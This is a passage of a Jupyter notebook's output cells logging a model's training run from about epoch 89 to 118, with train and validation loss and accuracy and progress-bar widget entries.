      "2024-01-30 23:00:19 | INFO | Validation Loss: 0.7660 | Validation Accuracy: 0.8104\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7506afe435a74d0f97e2d17688d3cfcb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:00:31 | INFO | Epoch 89 | Train Loss: 0.5505 | Train Accuracy: 0.8834\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5e4643e6836042acbe50d862fad0b105",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:00:32 | INFO | Validation Loss: 0.7258 | Validation Accuracy: 0.8135\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2c3e6683dba14a79aed340f58fd54df5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:00:44 | INFO | Epoch 90 | Train Loss: 0.5469 | Train Accuracy: 0.8819\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "71f5638ed05e483683fdb1537fcb7ebc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:00:46 | INFO | Validation Loss: 0.7189 | Validation Accuracy: 0.8217\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4cd05e32c57b4dd5a2f60b9ed5c85e88",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:01:01 | INFO | Epoch 91 | Train Loss: 0.5244 | Train Accuracy: 0.8892\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f152fb7239204d809333864c026669b8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:01:03 | INFO | Validation Loss: 0.6613 | Validation Accuracy: 0.8384\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a1706c0e42e34b22adead6fc1b02215e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:01:16 | INFO | Epoch 92 | Train Loss: 0.5057 | Train Accuracy: 0.8943\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ec7c619680344f6aa74c3bf39a138b66",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:01:18 | INFO | Validation Loss: 0.7123 | Validation Accuracy: 0.8287\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "98d9565f05a7481397edb9d1f5e307e6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:01:32 | INFO | Epoch 93 | Train Loss: 0.5373 | Train Accuracy: 0.8875\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "964a41331b7b45b2af3441ee153f7f30",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:01:33 | INFO | Validation Loss: 0.8208 | Validation Accuracy: 0.7968\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "79e0611ac67f42f7a2a0fd983dd2889a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:01:45 | INFO | Epoch 94 | Train Loss: 0.5129 | Train Accuracy: 0.8941\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0b0d9b06da434a07af5788b2ba30731d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:01:47 | INFO | Validation Loss: 0.8540 | Validation Accuracy: 0.7958\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5bfab56645d34cc6aee9db030f095e4f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:01:59 | INFO | Epoch 95 | Train Loss: 0.5277 | Train Accuracy: 0.8888\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ffd295609ba544d58f401b6b98bbb593",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:02:01 | INFO | Validation Loss: 0.7521 | Validation Accuracy: 0.8276\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cbe7729408a54bd69cc13ef0a881d396",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:02:13 | INFO | Epoch 96 | Train Loss: 0.5238 | Train Accuracy: 0.8909\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "10892c84ee724dd685b408893eb1cf50",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:02:14 | INFO | Validation Loss: 0.8950 | Validation Accuracy: 0.7930\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bcdb02455ed245a19ace8db9fbaf666c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:02:26 | INFO | Epoch 97 | Train Loss: 0.5280 | Train Accuracy: 0.8923\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0c775e82978a4a32b640e6fa222e2aee",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:02:27 | INFO | Validation Loss: 0.7779 | Validation Accuracy: 0.8149\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2b819ad917ef47d59c5d344b43dd65d8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:02:39 | INFO | Epoch 98 | Train Loss: 0.5137 | Train Accuracy: 0.8925\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "60d5535d50d649aaadea093d3cf2b5b4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:02:41 | INFO | Validation Loss: 0.8304 | Validation Accuracy: 0.8056\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8e37a3f465944f869c9acdbfd781a577",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:02:53 | INFO | Epoch 99 | Train Loss: 0.5287 | Train Accuracy: 0.8903\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5d4122768e944e3eb31ff2c21e192096",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:02:54 | INFO | Validation Loss: 0.7353 | Validation Accuracy: 0.8196\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e53c4697ae084ed786098d8c27525f35",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:05 | INFO | Epoch 100 | Train Loss: 0.4986 | Train Accuracy: 0.8983\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bc5cc8bbb214466b87e02fd74515a708",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:06 | INFO | Validation Loss: 0.8009 | Validation Accuracy: 0.8104\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ae02fd5365a24bb49bf4d91ddca65844",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:18 | INFO | Epoch 101 | Train Loss: 0.5194 | Train Accuracy: 0.8925\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7c1657fbd877406580b165e853435013",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:19 | INFO | Validation Loss: 0.7494 | Validation Accuracy: 0.8122\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c14f99db5a1644b0883608e7cd42789d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:30 | INFO | Epoch 102 | Train Loss: 0.5245 | Train Accuracy: 0.8910\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "123549b3319e445a9cba1cbc4e923b31",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:32 | INFO | Validation Loss: 0.8615 | Validation Accuracy: 0.8030\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c34ce4045b7142e9961a7f5da04f80a9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:43 | INFO | Epoch 103 | Train Loss: 0.5132 | Train Accuracy: 0.8934\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3d73027bea1d4eaea9d32ad3e40fe8c7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:44 | INFO | Validation Loss: 0.7611 | Validation Accuracy: 0.8120\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "15a5444d742646efb6d7ab5efdf72cf9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:55 | INFO | Epoch 104 | Train Loss: 0.5266 | Train Accuracy: 0.8895\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dc6c30aab5f346188040e644244336d7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:03:57 | INFO | Validation Loss: 0.8343 | Validation Accuracy: 0.8064\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5c5f098f3ba446fb953e8958238428f2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:04:09 | INFO | Epoch 105 | Train Loss: 0.4940 | Train Accuracy: 0.8988\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "83f1774693ff4dbc8f462e0fa2e33f18",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:04:11 | INFO | Validation Loss: 0.8014 | Validation Accuracy: 0.8032\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6ca4ff8fc6864768932e07a207ef06e8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:04:22 | INFO | Epoch 106 | Train Loss: 0.5175 | Train Accuracy: 0.8928\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7991e61364a44d8183e2949ede4c930f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:04:24 | INFO | Validation Loss: 0.7875 | Validation Accuracy: 0.8183\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a3fa5cc40e69408f9d50d0d08346b01b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:04:35 | INFO | Epoch 107 | Train Loss: 0.5066 | Train Accuracy: 0.8961\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d8dcaa2dd30347658330dac4a7782349",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:04:37 | INFO | Validation Loss: 0.8431 | Validation Accuracy: 0.8037\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "71ed2982eea4489b9ef76239e477b19e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:04:50 | INFO | Epoch 108 | Train Loss: 0.5291 | Train Accuracy: 0.8913\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1e06692701af40ad9ecbbf18fa96a3b5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:04:52 | INFO | Validation Loss: 0.7513 | Validation Accuracy: 0.8156\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "546c50753458432f8ec584c07b9612fe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:05:05 | INFO | Epoch 109 | Train Loss: 0.5483 | Train Accuracy: 0.8854\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b28c659279da419db17135bb348982bd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:05:06 | INFO | Validation Loss: 0.7512 | Validation Accuracy: 0.8303\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "706c2d134cee4995bcfb0e09cc7fcaf0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:05:19 | INFO | Epoch 110 | Train Loss: 0.4882 | Train Accuracy: 0.8996\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ca12d2db2bf945ff8f562e5243a84e4e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:05:21 | INFO | Validation Loss: 0.8244 | Validation Accuracy: 0.8121\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "531d1f14964141c788bfd7ff89df3b9d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:05:33 | INFO | Epoch 111 | Train Loss: 0.5653 | Train Accuracy: 0.8798\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dd530cc012e643a3aaf54c77075786de",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:05:35 | INFO | Validation Loss: 0.9372 | Validation Accuracy: 0.7973\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f98a02da55ae42f880a5d7a35345ada5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:05:47 | INFO | Epoch 112 | Train Loss: 0.5102 | Train Accuracy: 0.8915\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1b3d06b3ad514090800c035d9cdba0a3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:05:49 | INFO | Validation Loss: 0.8886 | Validation Accuracy: 0.7901\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6306d1c4c6104e89a822e546930ef720",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:06:03 | INFO | Epoch 113 | Train Loss: 0.5136 | Train Accuracy: 0.8937\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8de4ddfc037f412db8a61c87acc4dd0d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:06:05 | INFO | Validation Loss: 0.7606 | Validation Accuracy: 0.8301\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e728d628f7494fd6ac9e076748f4defe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:06:17 | INFO | Epoch 114 | Train Loss: 0.5206 | Train Accuracy: 0.8903\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3dd9b7aef56941b29a166fcf4396fafc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:06:19 | INFO | Validation Loss: 0.8064 | Validation Accuracy: 0.8121\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "94b7e0b3ded84780baf6cea12acd91ea",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:06:31 | INFO | Epoch 115 | Train Loss: 0.5246 | Train Accuracy: 0.8881\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "763ef58cee864670bf1c3d5cae0c36a1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:06:33 | INFO | Validation Loss: 0.8345 | Validation Accuracy: 0.8131\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8f50bd87cc724a79b8a03a950cb84f12",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:06:46 | INFO | Epoch 116 | Train Loss: 0.5270 | Train Accuracy: 0.8896\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5aab02fe681d47f985b19c5904407939",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:06:47 | INFO | Validation Loss: 0.7851 | Validation Accuracy: 0.8145\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7f2a11b553df462a9261e2fd380af9ba",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:06:59 | INFO | Epoch 117 | Train Loss: 0.5306 | Train Accuracy: 0.8858\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8e4274e008b24542b5b30fc06025e45a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:07:01 | INFO | Validation Loss: 0.8411 | Validation Accuracy: 0.8150\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b81751e5598948bc854a89aa9262a13c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:07:13 | INFO | Epoch 118 | Train Loss: 0.5071 | Train Accuracy: 0.8934\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "70b013e3b7ba49afa6831ecf4ef01bca",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:07:14 | INFO | Validation Loss: 0.8690 | Validation Accuracy: 0.7964\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0ad028ca9695494b9adad4e8b998866f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
